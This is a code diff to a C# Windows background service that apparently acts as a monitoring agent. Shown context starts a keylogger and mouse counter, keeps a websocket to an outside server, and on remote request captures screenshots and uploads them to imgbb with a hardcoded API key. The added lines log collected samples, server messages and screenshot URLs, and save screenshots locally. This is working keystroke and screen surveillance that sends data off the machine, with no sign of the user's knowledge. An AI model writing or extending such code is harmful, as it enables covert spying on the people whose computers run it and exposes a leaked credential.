@@ -13,6 +13,7 @@ public class Worker : BackgroundService
 {
     const string WS_URI = false ? "ws://localhost:8392/socket" : "wss://ws.alimad.co/socket";
     static string ipa = "0.0.0.0";
+    private System.Threading.Timer? _flushTimer;
     const double TOTAL_RAM = 8L * 1024 * 1024 * 1024;
     const int CPU_CORES = 8;
     uint last_process = 0;
@@ -39,13 +40,16 @@ public class Worker : BackgroundService
 
     [StructLayout(LayoutKind.Sequential)]
     struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
-
     public Worker()
     {
         KeyLogger.Start();
         MouseCounter.Start();
         Task.Run(GetPublicIpAsync);
         Task.Run(() => WsConnectLoopAsync(wsCts.Token));
+
+        SessionLogger.StartSession();
+        _flushTimer = new System.Threading.Timer(_ => SessionLogger.Flush(), null, 10_000, 10_000);
+        AppDomain.CurrentDomain.ProcessExit += (_, __) => SessionLogger.Flush();
     }
 
     protected override async Task ExecuteAsync(CancellationToken token)
@@ -128,6 +132,7 @@ public class Worker : BackgroundService
                 sample["error"] = ex.Message;
             }
 
+            SessionLogger.LogSample(sample);
             _ = SendWebSocketSampleAsync(sample);
 
             await Task.Delay(sampleInterval, token);
@@ -205,6 +210,8 @@ public class Worker : BackgroundService
                         if (result.MessageType == WebSocketMessageType.Close) break;
 
                         using var doc = JsonDocument.Parse(Encoding.UTF8.GetString(buffer, 0, result.Count));
+                        SessionLogger.LogWebSocketMessage("received", doc.RootElement.ToString());
+
                         if (doc.RootElement.TryGetProperty("type", out var t) && t.GetString() == "request")
                         {
                             string targetDevice = doc.RootElement.GetProperty("device").GetString() ?? "";
@@ -217,6 +224,8 @@ public class Worker : BackgroundService
                                     string screenshotFile = Path.Combine(desktopPath, $"screenshot.png");
 
                                     string url = await UploadToImgBBAsync(bytes);
+                                    string savedPath = ScreenshotSaver.SaveScreenshot(url, bytes, DateTime.UtcNow);
+                                    SessionLogger.LogScreenshot(url);
 
                                     var payload = JsonSerializer.Serialize(new
                                     {
@@ -261,7 +270,6 @@ public class Worker : BackgroundService
         var content = new MultipartFormDataContent();
         content.Add(new StringContent(Convert.ToBase64String(imageBytes)), "image");
         content.Add(new StringContent("0035f29ef2ddb2862584cd5114e4a7ee"), "key");
-
         using var response = await httpClient.PostAsync("https://api.imgbb.com/1/upload", content);
         response.EnsureSuccessStatusCode();
         using var doc = JsonDocument.Parse(await response.Content.ReadAsStringAsync());
